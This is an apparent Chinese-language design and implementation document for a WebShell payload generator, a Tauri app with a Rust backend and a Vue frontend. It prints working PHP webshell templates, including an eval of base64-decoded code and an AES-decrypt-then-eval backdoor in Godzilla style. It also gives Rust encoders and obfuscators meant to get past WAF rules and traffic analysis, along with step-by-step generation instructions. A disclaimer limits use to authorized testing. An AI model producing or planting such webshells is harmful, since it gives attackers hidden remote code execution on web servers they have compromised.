# 载荷生成模块实现文档

## 📋 概述

本模块实现了完整的 WebShell 载荷生成功能，支持两种生成模式：**极简模式**（一句话编码/混淆）和**高级加密模式**（Godzilla 风格 AES 加密）。

---

## 🏗️ 架构设计

### 技术栈
- **Frontend**: Vue 3 (Composition API) + TypeScript + Pinia
- **Backend**: Rust (Tauri v2 Commands)
- **加密库**: `aes`, `base64`, `rand`, `hex`
- **序列化**: `serde`, `serde_json`

### 目录结构
```
src/
├── types/
│   └── payload.rs              # 类型定义
├── core/
│   └── generator.rs            # 核心生成引擎
└── cmd/
    └── payload.rs              # Tauri 命令

src/ (Frontend)
├── types/
│   └── payload.ts              # TypeScript 类型
├── stores/
│   └── payload.ts              # Pinia 状态管理
└── views/
    └── PayloadGeneratorView.vue # UI 组件
```

---

## 🔧 核心功能

### 1. 生成模式

#### Simple 模式 (极简模式)
**目标**: 绕过 WAF 静态规则检测

**策略**:
- 仅使用编码/混淆技术
- 保持代码极短（一句话）
- 不支持复杂加密

**支持的编码器**:
- ✅ Base64
- ✅ XOR
- ✅ GZInflate
- ✅ Hex
- ✅ URL Encode
- ✅ ROT13

**混淆级别**:
- Low: 变量名随机化
- Medium: 字符串拆分 + 变量随机化
- High: 多层编码 + 垃圾代码

#### Advanced 模式 (高级加密模式)
**目标**: 全功能支持，抗流量分析

**策略**:
- 内置强加密 (AES-128-CBC/AES-256-CBC)
- 动态密钥协商
- 完整的解密循环

**特点**:
- ✅ 隐藏简单编码选项
- ✅ 自动生成客户端配置
- ✅ 支持密钥导出

---

## 📐 数据结构

### PayloadConfig (配置)
```rust
pub struct PayloadConfig {
    pub mode: PayloadMode,              // simple | advanced
    pub script_type: ScriptType,        // php | jsp | aspx | asp
    pub password: String,               // 连接密码
    pub encode_type: Option<EncodeType>, // 仅 simple 模式
    pub encrypt_algo: Option<EncryptAlgo>, // 仅 advanced 模式
    pub obfuscation_level: ObfuscationLevel,
    pub output_filename: Option<String>,
    pub template_name: Option<String>,
}
```

### PayloadResult (结果)
```rust
pub struct PayloadResult {
    pub code: String,                   // 生成的源码
    pub client_config: Option<ClientConfig>, // 仅 advanced 模式
    pub filename: String,               // 文件名
    pub size: u64,                      // 文件大小
    pub success: bool,                  // 成功标志
    pub message: Option<String>,        // 消息
}
```

### ClientConfig (客户端配置)
```rust
pub struct ClientConfig {
    pub key: String,        // 加密密钥 (Hex 编码)
    pub iv: String,         // 初始化向量 (Hex 编码)
    pub algorithm: String,  // 加密算法
    pub options: Value,     // 其他配置项
}
```

---

## ⚙️ 实现细节

### Simple 模式实现

#### 1. 基础模板
```rust
// PHP 基础模板
fn php_base_template(&self, password: &str) -> String {
    format!(r#"@error_reporting(0);@set_time_limit(0);...
if(isset($_POST['{}'])){{$cmd=$_POST['{}'];...}}"#, 
        password, password)
}
```

#### 2. Base64 编码
```rust
fn apply_base64(&self, code: String, script_type: &ScriptType) -> Result<String> {
    let encoded = base64::Engine::encode(&base64::engine::general_purpose::STANDARD, code.as_bytes());
    
    Ok(format!(r#"<?php @eval(base64_decode('{}'));?> "#, encoded))
}
```

#### 3. XOR 编码
```rust
fn apply_xor(&self, code: String, script_type: &ScriptType) -> Result<String> {
    let key: u8 = 0x42;
    let xor_bytes: Vec<u8> = code.bytes().map(|b| b ^ key).collect();
    let hex_encoded: String = xor_bytes.iter().map(|b| format!("{:02x}", b)).collect();
    
    // 生成包含 XOR 解密逻辑的 PHP 代码
}
```

#### 4. 混淆 - 变量名随机化
```rust
fn low_obfuscation(&self, code: String) -> String {
    let mut rng = rand::thread_rng();
    let var_name: String = (0..6)
        .map(|_| {
            let chars = b"abcdefghijklmnopqrstuvwxyz0123456789";
            chars[rng.gen_range(0..chars.len())] as char
        })
        .collect();
    
    code.replace("$cmd", &format!("${}", var_name))
}
```

### Advanced 模式实现

#### 1. 密钥生成
```rust
fn generate_key_iv(&self) -> (Vec<u8>, Vec<u8>) {
    let mut rng = rand::thread_rng();
    let key: [u8; 16] = rng.gen();  // AES-128: 16 字节
    let iv: [u8; 16] = rng.gen();   // CBC IV: 16 字节
    (key.to_vec(), iv.to_vec())
}
```

#### 2. AES-128-CBC 加密
```rust
fn encrypt_payload(&self, code: &str, key: &[u8], iv: &[u8], algo: &EncryptAlgo) -> Result<String> {
    // PKCS7 Padding
    let block_size = 16;
    let padding_len = block_size - (code.len() % block_size);
    let mut padded = code.as_bytes().to_vec();
    padded.extend(std::iter::repeat(padding_len as u8).take(padding_len));
    
    // CBC 模式加密
    let mut encrypted = Vec::new();
    let mut prev_block = iv.to_vec();
    
    for chunk in padded.chunks(16) {
        let mut block = chunk.to_vec();
        // XOR with previous ciphertext
        for i in 0..16 {
            block[i] ^= prev_block[i];
        }
        
        // Encrypt block using AES
        let cipher = Aes128::new(GenericArray::from_slice(key));
        let mut block_array = GenericArray::clone_from_slice(&block);
        cipher.encrypt_block(&mut block_array);
        
        encrypted.extend_from_slice(&block_array);
        prev_block = block_array.to_vec();
    }
    
    // Base64 编码输出
    Ok(base64::Engine::encode(&base64::engine::general_purpose::STANDARD, &encrypted))
}
```

#### 3. 高级模板 (Godzilla 风格)
```rust
fn php_advanced_template(&self, password: &str) -> String {
    format!(r#"<?php
@error_reporting(0);
@set_time_limit(0);

$key = '{}';
$iv = substr(md5($key), 0, 16);

if(isset($_POST['{}'])){{
    $data = base64_decode($_POST['{}']);
    $decrypted = openssl_decrypt($data, 'AES-128-CBC', md5($key, true), OPENSSL_RAW_DATA, $iv);
    if($decrypted){{
        @eval($decrypted);
    }}
}}
?>"#, password, password, password)
}
```

---

## 🔌 Tauri 命令

### 1. generate_payload_cmd
生成载荷

**输入**:
```typescript
config: PayloadConfig
```

**输出**:
```typescript
Result<PayloadResult>
```

**示例**:
```typescript
const result = await invoke('generate_payload_cmd', {
  config: {
    mode: 'simple',
    script_type: 'php',
    password: 'mypassword',
    encode_type: 'base64',
    obfuscation_level: 'medium',
  }
})
```

### 2. get_generated_payloads
获取历史记录

**输出**:
```typescript
Result<Vec<PayloadResult>>
```

### 3. save_file_cmd
保存文件

**输入**:
```typescript
{
  path: string,
  content: string
}
```

### 4. export_client_config_cmd
导出客户端配置

**输入**:
```typescript
{
  config: ClientConfig,
  path: string
}
```

---

## 🎨 前端实现

### Pinia Store

#### 状态
```typescript
const config = ref<PayloadConfig>({...})
const generatedResult = ref<PayloadResult | null>(null)
const isGenerating = ref(false)
const error = ref<string | null>(null)
const history = ref<PayloadResult[]>([])
```

#### 联动逻辑
```typescript
// 模式切换时的字段联动
watch(
  () => config.value.mode,
  (newMode: PayloadMode) => {
    if (newMode === 'advanced') {
      // 高级模式：禁用 encode_type，启用 encrypt_algo
      config.value.encode_type = undefined
      config.value.encrypt_algo = 'aes128_cbc'
    } else {
      // 简单模式：禁用 encrypt_algo，启用 encode_type
      config.value.encrypt_algo = undefined
      config.value.encode_type = 'none'
    }
  }
)
```

#### 防抖预览
```typescript
const generatePreview = async (delay = 500) => {
  if (debounceTimer) clearTimeout(debounceTimer)
  
  return new Promise<void>((resolve) => {
    debounceTimer = setTimeout(async () => {
      await generate()
      resolve()
    }, delay)
  })
}
```

### UI 组件特性

1. **响应式布局**: 双栏布局，支持移动端单栏
2. **动态表单**: 根据模式自动切换表单项
3. **实时预览**: 带防抖的代码预览
4. **操作按钮**: 复制/下载/导出配置
5. **历史记录**: 显示最近生成的载荷
6. **状态反馈**: Loading 状态 + 错误提示

---

## 📦 依赖配置

### Cargo.toml
```toml
[dependencies]
tauri = { version = "2", features = [] }
tauri-plugin-fs = "2"
tauri-plugin-dialog = "2"
serde = { version = "1", features = ["derive"] }
serde_json = "1"
thiserror = "1"
rand = "0.8"
base64 = "0.21"
hex = "0.4"
urlencoding = "2"
chrono = "0.4"
aes = "0.8"
```

### package.json
```json
{
  "dependencies": {
    "pinia": "^2.1.0",
    "vue": "^3.4.0",
    "@tauri-apps/api": "^2.0.0",
    "@tauri-apps/plugin-fs": "^2.0.0",
    "@tauri-apps/plugin-dialog": "^2.0.0"
  }
}
```

---

## 🔒 安全说明

### 用途声明
本工具仅用于：
- ✅ 安全研究
- ✅ 渗透测试教学
- ✅ 红队演练
- ✅ 网络安全教育

### 免责声明
⚠️ **严禁用于非法用途**  
生成载荷仅限授权测试环境使用，未经授权攻击他人系统属违法行为。

---

## 🚀 使用指南

### 1. 简单模式使用流程

```
1. 选择 "极简模式"
2. 选择脚本类型 (PHP/JSP/ASPX)
3. 输入连接密码
4. 选择编码器 (Base64/XOR/Hex 等)
5. 调整混淆强度
6. 点击 "生成载荷"
7. 复制代码或下载文件
```

### 2. 高级模式使用流程

```
1. 选择 "高级加密"
2. 选择脚本类型 (PHP/JSP/ASPX)
3. 输入连接密码
4. 选择加密算法 (AES-128/AES-256)
5. 调整混淆强度
6. 点击 "生成载荷"
7. 导出客户端配置文件
8. 使用配置好的客户端连接
```

---

## 📝 开发待办

### 短期
- [ ] 完善 GZInflate 压缩逻辑
- [ ] 实现更多混淆技术
- [ ] 添加自定义模板支持
- [ ] 集成文件对话框选择保存路径

### 中期
- [ ] 实现更多加密算法 (ChaCha20, etc.)
- [ ] 添加载荷测试功能
- [ ] 实现批量生成
- [ ] 添加插件系统

### 长期
- [ ] 支持更多脚本语言 (Python, Node.js)
- [ ] 实现载荷更新功能
- [ ] 添加 C2 通信模拟
- [ ] 集成漏洞扫描

---

## 📚 参考资料

- [Tauri v2 文档](https://tauri.app/)
- [AES Crate](https://docs.rs/aes/)
- [Base64 Crate](https://docs.rs/base64/)
- [Godzilla Project](https://github.com/BeichenDream/Godzilla)
- [One-line PHP Trojan](https://www.landGrey.me/blog/17/)

---

**文档版本**: v1.0  
**创建时间**: 2026-03-18  
**维护者**: FG-ABYSS Team
